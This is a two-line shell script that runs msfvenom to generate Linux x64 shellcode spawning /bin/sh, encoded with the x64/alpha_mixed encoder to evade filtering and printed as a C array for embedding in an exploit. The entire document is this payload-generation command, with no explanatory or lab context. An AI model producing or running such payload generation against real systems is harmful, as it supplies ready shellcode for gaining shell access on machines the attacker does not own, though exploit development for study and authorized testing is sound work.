#!/bin/sh
msfvenom -a x64 --platform linux -p linux/x64/exec CMD=/bin/sh -e x64/alpha_mixed -f c
